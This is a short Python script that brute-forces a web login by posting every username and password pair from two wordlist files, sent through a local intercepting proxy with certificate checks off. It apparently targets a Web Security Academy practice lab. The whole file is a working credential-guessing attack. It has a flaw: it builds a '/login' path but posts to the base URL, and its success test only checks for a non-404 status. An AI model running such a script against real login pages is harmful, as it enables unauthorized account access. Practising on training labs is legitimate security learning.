import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def Full_brute(s, url):
	uri = url + '/login'
	with open('user.txt') as u, open('password.txt') as p:
		u_lines = u.readlines()
		p_lines = p.readlines()
		for username in u_lines:
			for password in p_lines:
				usernames = username.strip()
				passwords = password.strip()
				data = {'username': usernames, 'password': passwords}
				r = s.post(url,data=data,allow_redirects=False,verify=False,proxies=proxies)
				if r.status_code != 404:
					print('\r' + usernames + ':' + passwords)
					


def main():
	s = requests.Session()
	url = 'https://0abb007103399dcc857c1c4900550021.web-security-academy.net'
	Full_brute(s, url)

if __name__=='__main__':
	main()